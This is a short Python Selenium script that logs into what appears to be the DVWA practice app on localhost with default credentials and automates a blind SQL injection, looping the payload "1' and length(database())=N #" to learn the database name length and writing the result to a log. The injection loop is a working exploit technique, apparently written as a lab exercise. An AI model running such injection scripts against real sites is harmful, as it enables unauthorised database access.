from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from bs4 import BeautifulSoup
import time
from selenium.webdriver.common.by import By


def sqlinjection(host):
    timeToSleep=1
    #create a new Firefox session
    driver = webdriver.Chrome('/Users/jonghyeokkim/Downloads/chromedriver')

    #driver.implicitly_wait(30)
    driver.maximize_window()
        
    # navigate to the application home page
    driver.get(host+"/login.php")
        
    # get the search textbox
    username = driver.find_element("name","username")
    password=driver.find_element("name","password")

    # enter search keyword and submit
    username.send_keys("admin")
    password.send_keys("password")
    login=driver.find_element("name","Login")
    time.sleep(timeToSleep)
    login.click()
    
    # creating a log file 
    fp = open('sqloutput.log','w')

    driver.get(host+"/vulnerabilities/sqli_blind/")
    sucess_message = 'User ID exists in the database.'
    is_true = False
    db_size = 1
    while not is_true:
        inputElement = driver.find_element("name","id")
        time.sleep(1)
        inputElement.send_keys(f"1' and length(database())={db_size} #")
        time.sleep(1)
        inputElement.send_keys(Keys.ENTER)
        time.sleep(1)
        elem = driver.find_element(By.CSS_SELECTOR, "pre")   
        if elem.text == sucess_message:
            is_true = True
        else:
            db_size += 1

    text = f"Matched db name size : {db_size}"
    fp.write(text)
    fp.close()
    time.sleep(3)
    driver.close()
    
sqlinjection("http://localhost")
